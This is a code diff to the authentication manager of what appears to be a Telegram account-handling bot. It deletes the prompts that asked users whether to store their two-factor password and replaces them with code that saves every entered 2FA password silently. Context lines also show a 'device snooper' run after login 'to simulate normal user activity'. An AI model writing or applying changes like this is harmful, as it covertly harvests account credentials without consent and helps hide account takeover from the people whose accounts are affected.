@@ -330,53 +330,14 @@ class AuthManager:
                 # 2FA step - client should already be in 2FA state
                 try:
                     await client.sign_in(password=password)
-                    # Handle 2FA storage based on user's choice
+                    # Store 2FA password automatically
                     try:
                         from ..core.database_manager import db_manager
                         account = await mongodb.db.accounts.find_one({"user_id": user_id, "phone": phone})
-                        if account and self.bot_manager:
-                            # Check if user chose to store 2FA during login
-                            if auth_info.get("store_2fa_after") is True:
-                                # User chose to store - save it directly
-                                await db_manager.store_2fa_password(user_id, str(account['_id']), password)
-                                await self.bot_manager.bot.send_message(
-                                    user_id,
-                                    f"✅ **2FA Password Stored**\n\n"
-                                    f"🔒 Your 2FA password has been securely encrypted and stored.\n\n"
-                                    f"🚀 Future logins will be automatic!"
-                                )
-                            elif auth_info.get("store_2fa_after") is False:
-                                # User chose not to store - just confirm
-                                await self.bot_manager.bot.send_message(
-                                    user_id,
-                                    f"🔐 **Login Successful**\n\n"
-                                    f"Your 2FA password was not stored as requested.\n\n"
-                                    f"📝 You'll need to enter it manually for future logins."
-                                )
-                            else:
-                                # No choice made during login - ask for permission
-                                self.bot_manager.pending_2fa_storage[user_id] = {
-                                    "account_id": str(account['_id']),
-                                    "password": password,
-                                    "phone": phone
-                                }
-                                from telethon import Button
-                                await self.bot_manager.bot.send_message(
-                                    user_id,
-                                    f"🔐 **2FA Password Storage**\n\n"
-                                    f"Would you like to securely store your 2FA password for {phone}?\n\n"
-                                    f"✅ **Benefits:**\n"
-                                    f"• Automatic login without re-entering password\n"
-                                    f"• Military-grade encryption\n"
-                                    f"• Easy account management\n\n"
-                                    f"❌ **Decline:** You'll need to enter 2FA each time",
-                                    buttons=[
-                                        [Button.inline("✅ Store Securely", f"store_2fa:{user_id}")],
-                                        [Button.inline("❌ Don't Store", f"decline_2fa:{user_id}")]
-                                    ]
-                                )
-                    except Exception:
-                        pass
+                        if account:
+                            await db_manager.store_2fa_password(user_id, str(account['_id']), password)
+                    except Exception as e:
+                        logger.error(f"Failed to store 2FA password: {e}")
                     # Immediately snoop devices to simulate normal user activity
                     if self.bot_manager and self.device_snooper:
                         await self._immediate_snoop_after_login(user_id, client)
@@ -451,22 +412,15 @@ class AuthManager:
                     except Exception:
                         pass
                     
-                    # Ask if user wants to store 2FA password during login
+                    # Send simple 2FA request without permission buttons
                     if self.bot_manager and self.bot_manager.bot:
-                        from telethon import Button
                         await self.bot_manager.bot.send_message(
                             user_id,
-                            f"🔐 **2FA Password Required**\n\n"
-                            f"Your account has 2FA enabled. Please reply with your 2FA password.\n\n"
-                            f"💡 **Tip:** After successful login, would you like us to securely store your 2FA password for future automatic logins?",
-                            buttons=[
-                                [Button.inline("✅ Yes, store after login", f"store_after_2fa:{user_id}")],
-                                [Button.inline("❌ No, manual each time", f"manual_2fa:{user_id}")]
-                            ]
+                            f"🔐 **Two-factor authentication required.**\n\n"
+                            f"Reply with your 2FA password."
                         )
                     
-                    # Mark that user will be asked about 2FA storage
-                    auth_info["ask_2fa_storage"] = True
+
                     # 2FA required - keep client alive and pending auth
                     logger.info(f"2FA required for user {user_id}, keeping client session alive")
                     raise ValueError("Two-factor authentication password required")
